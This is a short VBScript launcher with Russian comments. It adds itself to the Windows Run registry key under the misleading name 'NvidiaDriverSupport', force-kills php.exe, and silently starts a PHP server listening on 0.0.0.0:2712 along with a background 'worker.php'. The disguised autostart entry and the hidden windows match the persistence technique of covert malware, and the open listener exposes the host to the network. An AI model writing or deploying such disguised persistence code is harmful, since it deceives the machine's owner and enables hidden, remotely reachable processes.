' 1. Инициализация объектов (ОБЯЗАТЕЛЬНО В НАЧАЛЕ)
Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' 2. Определение путей
thisScriptPath = WScript.ScriptFullName
strPath = fso.GetParentFolderName(thisScriptPath)
phpExe = """" & strPath & "\php\php.exe"""

' 3. Автозагрузка (теперь WshShell точно существует)
regKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\NvidiaDriverSupport"
On Error Resume Next
WshShell.RegWrite regKey, """" & thisScriptPath & """", "REG_SZ"
On Error GoTo 0

' 4. Запуск процессов
' Сначала убиваем старые процессы
WshShell.Run "taskkill /F /IM php.exe", 0, True

' Запуск API сервера
WshShell.Run "cmd /c cd /d """ & strPath & """ && " & phpExe & " -S 0.0.0.0:2712 index.php", 0, False

' Запуск Воркера
WshShell.Run "cmd /c cd /d """ & strPath & """ && " & phpExe & " worker.php", 0, False